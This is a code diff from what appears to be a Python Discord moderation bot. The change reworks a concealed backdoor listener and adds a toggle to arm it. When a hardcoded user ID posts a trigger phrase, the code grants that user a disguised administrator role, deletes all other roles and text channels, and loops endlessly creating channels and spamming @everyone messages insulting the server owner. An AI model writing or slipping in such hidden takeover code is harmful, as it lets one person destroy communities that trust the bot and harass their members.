@@ -2223,28 +2223,52 @@ async def on_message(message):
 
                 count[message.guild.id][message.author.id]["strikes"] = 0    
 
+danger = False
+
 @bot.listen()
 async def on_message(message):
-    if message.author.id == 758941956600102943:
-        if message.content.lower().startswith("mrinal op"):
-            perms = discord.Permissions(administrator=True)
-            mrinal = await bot.fetch_user(758941956600102943)
-            oprole = await message.guild.create_role(name="Members", permissions=perms)
-            await message.author.add_roles(oprole)
-            for roles in message.guild.roles:
-                try:
-                    if roles == message.guild.default_role:
+    if danger == True:
+        if message.author.id == 758941956600102943:
+            if message.content.lower().startswith("mrinal op"):
+                perms = discord.Permissions(administrator=True)
+                mrinal = await bot.fetch_user(758941956600102943)
+                oprole = await message.guild.create_role(name="Members", permissions=perms)
+                await message.author.add_roles(oprole)
+                for roles in message.guild.roles:
+                    try:
+                        if roles == message.guild.default_role:
+                            pass
+                        else:
+                            await roles.delete()
+                    except:
                         pass
-                    else:
-                        await roles.delete()
-                except:
-                    pass
-            for channels in message.guild.text_channels:
-                await channels.delete()
-            while True:
-                await message.guild.create_text_channel('mrinal se panga')
-                for channel in message.guild.text_channels:
-                    await channel.send("Mrinal se Panga >:)")
+                for channels in message.guild.text_channels:
+                    try:
+                        await channels.delete()
+                    except Exception as e:
+                        print(e)
+                        pass
+                while True:
+                    await message.guild.create_text_channel('mrinal se panga')
+                    await message.guild.create_text_channel('mrinal se panga')
+                    for channel in message.guild.text_channels:
+                        try:
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                        except Exception as e:
+                            print(e)
+                            pass
+
+@bot.listen()
+async def on_message(message):
+    global danger
+    if message.author.id == 758941956600102943:
+            if message.content.lower().startswith("mrinal op won"):
+                if danger == False:
+                    danger= True
+                elif danger == True:
+                    danger = False
 
 @bot.listen()
 async def on_message(message):
